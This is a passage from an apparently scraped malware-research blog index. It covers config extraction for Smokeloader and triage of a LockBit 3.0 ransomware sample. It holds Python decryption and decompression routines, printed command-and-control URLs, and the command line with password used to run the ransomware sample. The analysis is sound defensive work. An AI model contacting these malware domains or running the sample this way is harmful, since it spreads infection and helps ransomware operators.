file but the header has been destroyed. The sections remain intact, and can be see starting at offset 0x400. There are some notes on reconstructing the PE file on the Unpacking Smokeloader and Reconstructing PE Programatically using LIEF blog. . Config . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . key = 0x0E63C2D43 str_data = unhex(&#39;2d8bf98b00db96cfde364292ce91c9058bad2360a60d67e613d64f4fc44ce8809ee356a4ca957ea0a796a902593924b0e29904dfcd92940e61888384c91983a732139d0660ec0dce4f048a68fd95cfe14da2ca0c82e98911d8c5d3c37c488d8c09afe29c11dcc58f9f680b93e18a17c1c2bf823b56840dbfe88700c4c3929420028498930696fe9a029b9e0882e98911d8c5d3c30696ff931dc7c2058ce19a439a0794e49118dcd8900694fecd2f9b9e0687e38c11d8c50790e59a1cc49fd20a90fb9c26cdde93983d4207b5e88d03c1c38e04cdef960404c6feb93604c6bdcd080ac6feda4090f4c5c16a740cc68d8c70f4acc5f13a2c92e008c68d8c708dac93f11c918d9a70cfac93f1242c93e0c5a658ece14660d41b14a97f852a03aa12c68dbe70f8acb0f1162ca0e0a2a62bece4460cc68dab70edacadf1022cc4e008cd8d9a70d0ac85f108cd8d9b70c4ac8cf108cd8d9d70c9ac94f120d98da570c7ac8ef1372ccfe0bfa60eeca44621d41c14e07fc62a19aa488597a308b38db070fbacb4f15ea08d9070c6ac94f1372c8fe082a647ec954636d41814ec7f9a2a50aa4c8595a3fe3fabb8930dacc1838715363d9b3c77c08abf83fcc01d61c0e92bca8ffc69abfbde3d66d38f71578e6b29684526e658de2ab7f813916f65a6cb95b942b0088c8d8f70cdac8ef110ab8d9070dbac94f1682cc1e0d3a619ec0ab38dab7099acd0f11f2c26d28dc67091acd9f17f2cd0e0c7a647ecf2467fd43c14b97f902a4aaa1d85d5a3b43ff7b8ca0d42a58d9670daac85f1342c8ee08ea64aec85462ad40e14e87fd52a1caa5985c5a3cc3fb5b8950db8c191870436269b7377ef8af783e1c05e61c3e97ccaddfc2cabeede44a28d9c70cbac85f1222c95e0cca64aeceb4660d44214847faa2a22aa488583a3eb3fb5b89f0dbdc1d88741363c9b2777da8ae083bec01f6198e979caabfc61abeede7d6646a28d9c70cbac85f1222c95e0cca64aeceb4660d44214847faa2a22aa488583a3eb3fb5b89f0dbdc1d88741363c9b2777da8ae083f7c00a6198e973caddfc17abb8de21668e8f08cd8d9c70c7ac8df108cd8d9070daac87f108cd8d9170cdac94f100000074311e0d90602cc7978436088dcbe6c297873c97b2a604b194b5047e796040f4064a1927c4f15868b45c2ed186330ddb60a93cf3b4691a1e9a2306227810f2dccdd510b06c90349f000000006c1100108c110010b412001020130010941300104c110010a4100010e8100010b813001074130010c4170010a417001080100010c810001017008bbd0d161ec11409c1cca01d2778f6253717e296e6324b153620a909a60d1823f27ce0fc29685fa33464f5bf3d7697c30dbbf100a5541ed1b8ddca8a7067e0&#39;) ptr = 0 while ptr &lt;= 0x319: str_len = str_data[ptr] print(rc4crypt(str_data[ptr+1:ptr+1+str_len], struct.pack(&#39;&lt;I&#39;, key)).replace(b&#39; x00&#39;,b&#39;&#39;)) ptr = ptr+1+str_len . b&#39;https://dns.google/resolve?name=microsoft.com&#39; b&#39;Software Microsoft Internet Explorer&#39; b&#39;advapi32.dll&#39; b&#39;Location:&#39; b&#39;plugin_size&#39; b&#39; explorer.exe&#39; b&#39;user32&#39; b&#39;advapi32&#39; b&#39;urlmon&#39; b&#39;ole32&#39; b&#39;winhttp&#39; b&#39;ws2_32&#39; b&#39;dnsapi&#39; b&#39;shell32&#39; b&#39;svcVersion&#39; b&#39;Version&#39; b&#39;.bit&#39; b&#39;%sFF&#39; b&#39;%02x&#39; b&#39;%s%08X%08X&#39; b&#39;%s %hs&#39; b&#39;%s%s&#39; b&#39;regsvr32 /s %s&#39; b&#39;%APPDATA%&#39; b&#39;%TEMP%&#39; b&#39;.exe&#39; b&#39;.dll&#39; b&#39;.bat&#39; b&#39;:Zone.Identifier&#39; b&#39;POST&#39; b&#39;Content-Type: application/x-www-form-urlencoded&#39; b&#39;open&#39; b&#39;Host: %s&#39; b&#39;PT10M&#39; b&#39;1999-11-30T00:00:00&#39; b&#39;Firefox Default Browser Agent %hs&#39; b&#39;Accept: */* r nReferer: http://%S%s/&#39; b&#39;Accept: */* r nReferer: https://%S%s/&#39; b&#39;.com&#39; b&#39;.org&#39; b&#39;.net&#39; b&#39;&#39; . ll = 0x18 key = 0x0C0C8260 data = unhex(&#39;54cbbe8ff42e4337a7145098628286e408bdcfdd95c30f25&#39;) print(rc4crypt(data, struct.pack(&#39;&lt;I&#39;, key))) . b&#39;http://nusurionuy5ff.at/&#39; . key = 0x0AC89E485 data = unhex(&#39;4c438a3e56df89d4297f8dfa9e83cb81a4904c63a41e1f6692ac00&#39;) print(rc4crypt(data, struct.pack(&#39;&lt;I&#39;, key))) . b&#39;http://monsutiur4.com/ xaf xf4 xc7 x14&#39; . key = 0x917A57DC data = unhex(&#39;6ecb20fa24d58995911a5d59dec7e4dd74f11ee2c7fc46d56191&#39;) print(rc4crypt(data, struct.pack(&#39;&lt;I&#39;, key))) . b&#39;http://moroitomo4.net/Q xdc xe2 x03&#39; . key = 0x3B7045D5 data = unhex(&#39;6afbb21cf76f16be6d09abf21a6aa407d83cbcad630f5597a205ae4fc76b3bba&#39;) print(rc4crypt(data, struct.pack(&#39;&lt;I&#39;, key))) . b&#39;http://susuerulianita1.net/ x87 xa1 xfd|p&#39; . key = 0x884CA0A1 data = unhex(&#39;bbcb0f8124742be0ae4f8aaf0941a7d496094d98358ac42666&#39;) print(rc4crypt(data, struct.pack(&#39;&lt;I&#39;, key))) . b&#39;http://cucumbetuturel4.co&#39; . s3 = open(&#39;/tmp/out1_sect1_400.bin&#39;, &#39;rb&#39;).read() table_start = 0x76c table_end = 0x7A0 for ptr in range(table_start, table_end, 4): c2_data_address = struct.unpack(&#39;&lt;I&#39;, s3[ptr:ptr+4])[0] c2_data_offset = c2_data_address - 0x10001000 c2_data_len = s3[c2_data_offset] c2_data_key = s3[c2_data_offset+1:c2_data_offset+1+4] c2_data = s3[c2_data_offset+1+4:c2_data_offset+1+4+c2_data_len] print(rc4crypt(c2_data, c2_data_key)) . b&#39;http://monsutiur4.com/&#39; b&#39;http://nusurionuy5ff.at/&#39; b&#39;http://moroitomo4.net/&#39; b&#39;http://susuerulianita1.net/&#39; b&#39;http://cucumbetuturel4.com/&#39; b&#39;http://nunuslushau.com/&#39; b&#39;http://linislominyt11.at/&#39; b&#39;http://luxulixionus.net/&#39; b&#39;http://lilisjjoer44.com/&#39; b&#39;http://nikogminut88.at/&#39; b&#39;http://limo00ruling.org/&#39; b&#39;http://mini55tunul.com/&#39; b&#39;http://samnutu11nuli.com/&#39; .",
            "url": "https://research.openanalysis.net/smoke/smokeloader/loader/config/yara/triage/2022/08/25/smokeloader.html",
            "relUrl": "/smoke/smokeloader/loader/config/yara/triage/2022/08/25/smokeloader.html",
            "date": " ‚Ä¢ Aug 25, 2022"
        }
        
    
  
    
        ,"post41": {
            "title": "Lockbit 3.0 Ransomware Triage",
            "content": "Overview . The sample: 80e8defa5377018b093b5b90de0f2957f7062144c83a09a56bba1fe4eda932ce is on MalwareBazaar. The comments state that this needs to be run with a decryption key... . Execution method: {04830965-76E6-6A9A-8EE1-6AF7499C1D08}.exe -k LocalServiceNetworkRestricted -pass db66023ab2abcb9957fb01ed50cdfa6a . References . Lockbit Black 3.0 Ransomware (infinitum IT) | LockBit 3.0: ‚ÄúMaking The Ransomware Great Again‚Äù (custer25) | LockBit: Ransomware Puts Servers in the Crosshairs | . . Analysis . LOL! This is just a straight ripoff of BlackMatter... even our old gifs of us resolving the imports for BlackMatter match exactly the imports ... . . Config Extraction . The config is stored similar to BlackMatter but it is in the .data section. . The data is first decrypted with a hard-coded single byte XOR, the decompressed with aplib. Once it has been decompressed the data itself is a set of compiled shellcode at different offsets. The shellcode is then dynamically loaded and executed as part of the decryption routine. . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def xor_byte_decrypt(data, key_byte): out = [] for i in range(len(data)): out.append(data[i] ^ key_byte) return bytes(out) . Config PRNG Code . The code to generate the keys used to decrypt the config is itself encrypted and compressed. At runtime it is decrypted and loaded into memory. . config_data = unhex(&#39;6330615a31683f92c7f1d1ae327037a5f0b4134439c9f7c0b036c2696bf35a372b6803f90bfc3e342082c834ca6e7001bbf8f1f93dfe3fe0def2cf0dd7176581dc6163cc753cca7d28243bf83a2045ddb02a38c7d16b696d4cf2d18e2098e83f25552433384fdee39429eb5d5afc3f332df034581dc46168f03a4fa57c626028d89dcf32357f2cb157c7f7e24e4ba124b933fb56726238040ccf43432903d8be0f6ba1b238ee3dd8001327159516363a7338264b3c732b10204b24db3c28b12cdd353c10b114dccaceb470181cc6dfb6700004c6d4b670080cc6e9b6707074c6feb670787cc6f3b6706064c688b670686c9283143b503f54589254583f5c58a754403f4458bc5148b1d267b13c124c4b88a2493759e235b4382172c7d2120c521c342aa4e70f66678c45c7614df6c2b707361366349b378b679d4700d5772fa7d072071876df07663c12580b6210f878109c7227297620702437580b73f86010f1c2cdb87628f8702c0b71ea2e716832e6e794101038140b71ea2e715032db87941018381c0b71ea2e71586430781000200446b3840c40b2b52547781008200c46b3840c48b04c6f796e3f5030300000&#39;) ptxt_config_data = xor_byte_decrypt(config_data, 0x30) dec_config_data = aplib_decompress(ptxt_config_data) open(&#39;/tmp/lb_dec.bin&#39;,&#39;wb&#39;).write(dec_config_data) . 681 . Config Layout and Data . There are three components to the config each that seem to use a different shellcode PRNG.... the &quot;config&quot; which uses the same PRNG key as BlackMatter, the ransome note, and the salsa matri, both of which use a different PRNG key. . Config (BlackMatter PRNG Key) . import struct def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def gen_key(seed, key_length): out = b&#39;&#39; tmp_seed = seed for i in range(key_length): tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF out += struct.pack(&#39;&lt;Q&#39;,(tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF) return out def decrypt(enc_data, seed): out = [] padding = 8 - len(enc_data) % 8 if padding != 8: enc_data += b&#39; x00&#39; * padding data_size = len(enc_data) keystream = gen_key(seed, data_size) for i in range(0,data_size,8): out.append(enc_data[i] ^ keystream[i]) out.append(enc_data[i+1] ^ keystream[i+5]) out.append(enc_data[i+2] ^ keystream[i+1]) out.append(enc_data[i+3] ^ keystream[i+4]) out.append(enc_data[i+4] ^ keystream[i+2]) out.append(enc_data[i+5] ^ keystream[i+7]) out.append(enc_data[i+6] ^ keystream[i+3]) out.append(enc_data[i+7] ^ keystream[i+6]) if padding != 8: out = out[:-padding] return bytes(out) import requests def resolve_hash(hash_value): out = requests.get(&#39;https://hashdb.openanalysis.net/hash/add_ror13/&#39; + str(hash_value)) if out.ok: hashes = out.json().get(&#39;hashes&#39;,[]) if len(hashes) != 0: return hashes[0].get(&#39;string&#39;,{}).get(&#39;string&#39;,&#39;&#39;) else: return &#39;&#39; else: return &#39;&#39; . config_data = unhex(&#39;fcd2606251ec9a66463d000027e25eef70521901917606d17c373d36555d61b2dbcf08e0e622c432132a775d2debc5b1e363f250bc12717bde66cafcdc0c921f72b6d1a2adebec403ceef205d9e1ba246f3c4a475c224d4472401d3c28248db1d7d93cdda0f79098c6f63d9a9707297974a496c262338db5f1cd80a7fd52c16e05c92d6d5fa3ed9ad65f7fe50480b975f9b1b80ff62b8afbe7bf03271134076247f3c0f00a8a00bed02dab1fcd9d22b3ce789e1a6a5992df05681d7e1c9be3f2c2c1819309c11834359beaaf7cd2af607de0783ca272621f842220ededaa65873a432fe419d475256399e36890604a2a0d788507f23e3d157779abea5464fac16aa5f2a011abdcbba461684a9a561f769d1e0ecd44e97ee1b56fa8050148228287b04f2eff4ace3d268834d4b54747998830e5c3b10577c3f5ab0603c867e48e523dadd0ec9bcf5a0b0c3b1aa3a84a6af5e6a3c3de5a187e03e9c266a34ad4cfcc49b1c2123dc4429515bd050fc22cad53e02fdc31b0c29ca421c508af3914338b380a2b69d00b5c941a04e7be47bc7e732db1711c621f12f0e7d5de68bcb8c33845f14de2391f5b365373bc542f78f08fe3c963c6352cd441cbdaf35199e9cc0cb0a3e6e8cd02d7d086fc28f8214be30564ec790dba92e9229af6fbc3c092388afc281f8e988cf488771dbc2331d4d0cdad9ce34dc7de6af506f72c22ca69ab184204ab514b5907371c64a5a75a90d87489b103bae3a960945c1d3a8c1ad40566aa0baa0d685e2f4eb5798d7f25dbc7ca7f4e541032a8c40be67764bbac0690900d94f0328a71aa24cf0d583bbfeaedc854a439356adc94b038fb6ebdd6610945cd36aa50b71b63e41fb87f4c61e8056f8028621953ba20d23071768a41e0b572aef38ca697a88228e1e6f74adfb2b8e3598f2cc874a64619b99c32e9fd9aee46cc52c835e6d168f77ea55ec6f065011d7b9f4756132c86ebb013d5dc84da48484d9c4c4359df35f376895f53d7df4d8cdcf61fa49b8b19f1070d13cd419c1c1fe46c3b16039da4ee8f44dbedcbf3c51586f57d591e85f0e22140f3244028fdd61eff1c8085f0fd128ae76f731cafde66f1b221508924b646cc7883c52d5ba961472265664a8f27570dd67aac60bf5cdf93fe4e708004de5701d550da334e11a1df5f275258520f1ad09f5dcc4b6ec5a6801c8de41eb0ad51e0752e2bc4961d021cc03e288f7c78684059c14000d1c6167ec93bd634a1085ea3ab233e77838ee398d005895c3b64254e821556e6fc9f6263c074106e268389eb3dc2f462da7ba5822937c57194fe11387e45f714b7fa5ad098c19c6fde12327f9a631481a35f8334fe61d0aeac975592c46e2c3f8211cbd5a4344e313f58c02f1f014d2fd969f4a2407ca7621790a7ab536865d85549de3492858b6175698c5a4c4ab98ae37c50c827bae58d8bd8d83bd2397bfaba1e9d2bf58a4b3c9f4402278594dca50b724b96ffbee1a9c0b8fcbde9ff20beed888feea2d72572996bd80a6b56cf581a3e712c5a38281928c6a4342f072398807e297e4c8531042ebd9a9e58f5fe60b366e748e28396501290d2265a95b28f501f9ffc4f420630790f57416023c9481961f9e289dd9151fa1acbccf9c86a769dcae77c7066e578eec1c35cb833dbaff607c7ba0d3157a9da9962eb9c57a474b4d08c6389f171854fedb7d444d4121d5e300609f214790fe2c8760adb618b79a1a3c9d16b488fe2c29b40b5b353fabe60046dfd3ae72e0e816faa9e42c38bb5dbd9f880fa5fe91e82dbd2cab1e12ada72c6a27282c73096cf08e90ddb46742e28734d807ed5301432eaa7b1bca900c29b913b6c939db1df2144f54b551be6fd67e9cc7bd0b59c08946358fe7926332d78aec3ce7207cb3d687c879352c8ca3924f3fe4dd0f7a86d33067f01d9c00953edcac037b1ee42b3134993820356a2f0754ab24477ab324bb1669e1d74da17eb1c104120a4541d0bc16fc446125b9366fd9ba1b659b85b8a5bd007d1244267bc21b76387b587ece5b2980022d513c3c88fdbe0919941477c2aac20db92b444dc9fdabcae48c7f5288b6be375e1c9f595d38088335ea6fab5b87d05f5288e66480b32b795b4dc09c22ef67b7cf6f874b83c12d147cd7cf40bf21b920d1b65cf9fba5e03f2b9ffd5bdbca15f19fe55de578059e7a3ef6bee87172a11fa5b02ebc7f4d87e31e91d1039774509105ee25e8e313bca3af10e4cc0c56bd639cead6cc7f7c6e7216676150fe860945c4f0a1cd4b34a55bfc4c31ac3806d994e0cbca2e5921b9271ac1cc1115007ac6e32ad97a266b1c7fe236acec2e5ab95a8a845cd32ce837e2a708f9b4c58d1949c935163bb6dfed96881aeec989e53ac31bd15df039fb08f7031e82fa43bf860d00facb56a7def0de73df610be8118148dd639e64a64abcd0783e4410c5f218c00ff1b6dad8b50ea2db4eaf6e19b9ccaaf6e0f77f27b1bdb01bac1d0cb1de7b20334394c2f45b985f6bc57b0beabeaca5590a308eeb6aa505937b5005a866aa266714773cc9c796373f647b0bceb79879b7ae2dc1ca262c5138d65958cbe638f9c76d698e260b647cb41d5b5fc74e043875278771fd24e95b59860244984dc86d71b62e57015627a1c81da0af053ee9690248639ed29e060243ad7a0f6a410edd5649ece252d6294ce6fbb1030e3c575531fdf03a212aa2a221894dcd7023f07d9b2c7b985c62b8fa5594906f373fdcbf6e5a688dc98cf2d46308ff2bc1ba07b74c51e7494be595bff5ed413e52f343ee3bd1157509e48e00a7461c028811580915ea7c0603823df07175e0502569ba6065cd67e5356118044c2ab8a9f36ceaa497ee07ca78619244691e650210b9d1ef9cbcdfa07ab26225f78e953e4ce7cfdcce8a9061f3d2f90c1f3a7324b409455fccc7db6ba1471fc8b848c7853d060b4bf60d94c3b8e4c5a654f0d4eba188c171bfdaca566c2a32a4beb9f21eb2c456156a5d6f431f9422a14781eb29f7bb59d4df40abf564a4e200a63f1daba88f992107f796bd08918d43f0b739816aa0cbe1d0fcbfd0ddb1a48da6049d0738edd9a96c44a449637749aff64488d8dfb70577040bc8712ace723758ec932945717b6aea708ec1d0ec9be4aa2c85417789f52a76242e65629ef355ad20f4818e32df3c17bbb556ed88f7d07a9fdea29a55b8128eb7d0b1064915e9a732628da87666720f747cafaa05a2a1bf1509d0b8cdc1d7fe490d7a0fdda11b46f21439cea6b7d3e88cfc487b316ddac94ce498c5410bdd30bd7291002285d242daa97bbeef8c4d1e14ab90e708515a856f2cdcfe232a69dee09ddf1e5afd5c59b41f5c585c34582c6209f6f82cd5942b99d69c2b6523c93cc19632f9abd7a4f3512b0876ab14d9d71266f5d42eba6f5bb2b7788e02da833ce180fe041261730ee8eedbb0d36853beec4b7b1a77910c59751c3a45d8f71520e153c6c034fa94b162442fa64db0d8840a80e61ba936bbd00a9c202e9b6b3427864a62a2f01fc49f0dcb3fc6fd341afd678bb123ab67ef6a4f83c6e1b060368d7afccc8a3f16829d074a78a26ca22787f0872276af2a3d48a58c3fdcf30e8eee197d39da3e466642a78b43b76388afeb4c998325d9d56ae833df43db5447d284677438e77fe879546a012ee6649903b822548632461190a775f20d21fb9380d201d97c0aeaaeada522512dedf5f816f0cec44dcf5041eeb6797465f912e98b81ea7bd450e484fb20b9793f5dbaa571ac0feb40740f7eb538bcd5fea75bf4ee91796ef9d4df00f058a3ba2e22c120572845404d6e65227c4e604fba66bfca870cfe9d027ca902650a8b9ee6f6a13d480c5e0cac6e8f33c30bccb2e290ce05e9020cfa58854c2e7f4a4ff617298dacc24da93150f87e39924af07851c7ac91a61a818ef5d25b3ab97b9be10c0b49239f077f3c4f582a1c7c7574c8e3af96041a25e4730f36e3bea2ffff1f6a6a73a78eb228fab1332dfea2d9ccb209a38c331046cb01cc0a83aeca80c8ec28bcd1dff24c4b4ea45f73f7ac7ceeae7ab3548b10390772f96dfcd1cd291e88dda3e2620df5daaeb4ce580e3ccae5a8798334aa044990a2bde3c23514a676e747d2066a9789e8766d250672e47f9de6fa8c27e029365087bc1ec4c9147e10314b190ff5a0a3130b197cc9bdda9fb296b0781318b6a26415e4eb89f317aa523c41c32711a158f946b52328b6f6301a6fe6ef630bcc437dc64e836c75f394305daa7c2b9af598f81a7e5783cd327aaf7a8794552ec15a9d51c2a95fb923c15352ec1ca6284ef3ff565b8a917f5a509bf50444e7d5f32b1a48ac7aa6b08cf038c5d896868d766d4b3a04b9064630e9e86bf20d111d2cae8ae7428408510ac3bdbc2ccf8422bcd88f345b54ec85248ed9b2143c19808389b69579b8b6e7984a2f81973fdcc271bfc3af405462d0a2bd330645f1f58d0b5438b9d11caeb8e3e42dfa62fa84ec05190c5d5c4548ce34a9c69e466824033ec2e8aae04b8cc0f37ddabe9badded42314d5f9ce1bbcba40455f5d28f55af51e3680be07d59117e34aeeb2bdb44671243c094b2a68c7a639960ff0c86a4db47c664c4c4d8f36649d67237722abffe909a831c52b2d57efdf4714924e3e67261631223bf5d2693930642c714a35f74d7073c785c0c8f2b893c76f1c00d9a9f6780917a19f08c8e84de6b54a6ff78e21ce8e2f01b0e275dd1987cf49f6dd1d15f279888627b7798c7b8e00da4930d58d8ba69f9d2a493be8eb855aaa41f0a14ca228feda14c8f2faed3526091a7b71ce49fef339735d5e05425b329880546bbdee029bbdcb5590e3aaba40866b5a9b182dd58a33289f42b1cb2ed8201501e5d75bd94ee6cd6c8fde46a251d18cff400ed458e363bad01de37fdfe1c44230468245648b2b4021fe964c82e0ccab2ddf4a1174c795a661530647b47c3aeb1082dd778911e4f203e629bc2f211450c39529e472941fe6dda00c6ef8f000f2545b726ec41894881a84a2e363967d0a7e31f9398d7f1bf881c00258d717fe05b6e75ee0184249ffbf62f877c5ac7653d7311eb53f79dabeb2281833aaea2920425220425d9721d56752bb49181bdadbed44613f5d914ef4ed832655bd6e02ece8d44fb123de59461eca46b0d21e5318d572c2eac0a851c43a9474b93b88d26442d635e738e9d94f288dff2816be09279be21e81008e5e2a3defe0b750e4a9602d0f82fc3b4074f93a58852e88001608b131e992c1ef6ef144775252a5ea09e7045972dfdf6acceeaf11e9517c35645a02a2bd0010d8448cae038e0b4511377efe45c2be7284f7c92c2b003836ce0142d9e855e7310966d04da23386c17998a59174176e8b41db8d9e76eca220e71e094f6c3a03147b3aeb21fef734c1ee59be0482dabe50c35acda28ea3ec89dc7eba557bef4d189429cfd7a77f7654901fa9036acfb8462166f3d837f0142dd1a97057115be63691834750186d4843b7fb0a48da62a51d2c711554ff8ffc71cf08605769dc3f87306e68d88556cee52fef80d0fb9c2daebd8493788bbe4d314b7448a01be3e95096f12137f5749d0ea563269104fe0af303c656ccb06fc02ad967c13aa234d6850a169e69361b64eb9a95f806bcf3489fa6eac5b821937de1568c578007fc73fc1a91c92e6fcac1a062ae275c4684e0704a1139327cf201105710cf5606c31c65059cee878644e38febd5e3581d82492eb19e183675833cd7452e7d0cfe2ac7e7a40e01dadfa074d618be57f8ac545cc540954fb203617451a1656ea7fb994f08d6332c8800f7f119a50a2bf7119f0dece38872191a34d20d001ec9436b88856467e7492367b89732b1abe5ac6d462e42cdebbe8310fe65d89e8e011608a3a138b1325107043a9c44cc04a55ee4b8d008effc4281d166c979832f10ff2523e4dde33265533635629c39f30e46f98303fa856e53fa1b3fb57d90cab186ecd5628c53c2e21d9f95d073773f6d6ab4f3dc56a3ec05f97b601388ff66db12c54d48668a8f654918474e30316fd71565b409983bdac870c75e9e4e311765c766bf8a62bc5457c5040940f0a6c80239cbf73144429b508abbeaa3d2a65571155ac6dc70b85d3cba666d0412050e36d5521b314e8cd1379f42f900448fb08b7f55e874a2e0e13f8b5b46bb405f80e09444b0cd7611f2f83eb2a9d95b6a382fa17e634dd4493d78ab0b1155462e9ce3df08114a4429458ba3311175da6059c0b5168d5c87960e6c7aac185a6a574f2117d1bce7f60e3354b8d8ac5b9e2254634bd4e373ae9e38d9f6395b0d14f68a3eebf94c789afbb5ea14ca225423dec243489c8e41194b62bf5312132dd018c38f1830aa886a40179052935964e4b83c977a34242c59bd22daa481e640a49c9ed2c32f623e4163970fb1b2b4f70e594fd82c4cd8199337c1b36812e7777126077407598265959828a0a528545d2d1d5c4f727ecdd28f50896f1d5de6656e5c7c7680cb8581ca0f49d53a7b3d177bc54f525c0e622ffc695fdd2853a8a21378484a595aac0912d786c8a434c49abdc4f9fde66115c8191ab4fedbac1ea9f2b080baabd561f6f80d59e212fbe8d673185fcfa7f2e08bdead76f03ba1a2d1390126087b02a276af0d8a281a59794fbb3babf29b678e67fb53ad0be8b84331e54b199650857d8a417b3efc84c7546ae38aeb8c071925fbb8cde94c8aece3f6f153bddef60cba3f4f4362d0bd72c19d2c1a2207841eeb2aa6ae4b7f2cdc1a70c0777501cbdb71021e569ee8d82d0b00b0cf771ddf7208a4267715536b823b2f318129d16cbb877a02b229c3bccc5c8d8c5165ee33331956f6c4fdc29d4c548a52bf461ee02d03a7d186b5370dc47898b999fc366e4b98b21850d2429427d6fa8b9ef0c1950bbd729a2c56044ffe3e1731eff81ac17fdcb47f49ac483ab74ba9ff75894a21eb383e0c5b70696c7945762fd1b8c57ad119cbd419ec502f9652e421a995b3f0b192c21ec6a5ba07fb1d62185783482377cbae147fbf5cf49f932f547453a20362e5099fd0066548712426b0abc67fbde58fbf2f9f98f6700f38b61eb6538df4e4a4588dfee6bed75a03c23e0727255cb9f414e0b441ce528f8520bc3f187d69a7fa042e618f8316911a51e5d1d8f8d237661785ecd05b98eb8876fc16c0472eb09b0142c05fc14e3c6368dbda784168f7bb42fca9956922ee31d3cf5976899aba2204d4e2738dbc21e6da7820344de2607e614552496fa64bdca050c74b659edfc417bacf4e8403db48a8c513c16b7fa897a58aef54fc31ccc61045bfbcf84093a9698075c9558964cfb4e6c3116d89c3d9c7760997ab917a25a1162f41e4a65f3f6fb09e9d72db29b46905475fa965d77569b32feb538cc0e3e630dd1a8c11db7a96455ed7c695939480fb0f2c4c51781da2297fb26d714df96323a6cb7084e7025b01ed0fbd3796a237c54b975b99f99fe79a6f2f08a7e35cc02f1b7761ecf540deea57c68260976b1a0c1d45486e712edce06260c42e2ea2e70f94fd94faa2fbd7ad48208b602e0bc38ca6a572b2104cb3e0a8acb00cd85cd866d69ad4b99f59d1cfe9910f939b9cd66608f65312d0e0fa3ee464ccf2dda95b9ca9a3d02ff031666dfd134b7077ed1cd686af51b0bf0b24363a4ba94d6968d6fbc0ff1f7f1d4fcf346e619969ae3b4825140919b5be180327cf6b7a9b299c8a8ed7df0e65989be0d35aca5289f200da7a0a455be4d8482c24ab34c31566ed41a009153f4f101e088c296fb6541d190695578618a2670e7edefe7e051df29823d76895d50e30b7e829a7c893542c8fc165a7e9f28ef20b77ede46135dab8a11737c451c0b3d31f7d2b84249d9519c55e721e62fb7a7132c0a34d34aa04357a24d74a343d89ad3cea242c84ff8e6a32b1a2d8a2d3ee8cdc67933d14523d91225e121b8445fb142405b22a53fc48f9d0861f29144be2d1fe9cc2f40febdafbb363f75443df4484beaeab36235e45bfa0fac824332078bf28ef0c2c76b4d68226883a1e415beb1e176b650a8889ba9f434b83f3956c6cbf72fd8247943955082124a32754a4d5672af7bc79ba0b947e897ab5472aafe44fef34b72d2cc9c31007b8cb0628afa75ea71c8cd3dd483dd62934545c8334839838e1176f2377040031c228d1f68c31d025b4cdc9368f4a7d16dfec73d254c6690c882cbc3b726f2450a9e782f8dc43bf6381ebfb081f68024bae19bc3003d44b713037aefd494a00fd850a3e19281f6105f429f55c948548e936b095c2105e6c4e1b41b6d27e3472ff4c0b5566d2e5c7de6efc3c430670c1e3c153f6cbf32159d64cf445e0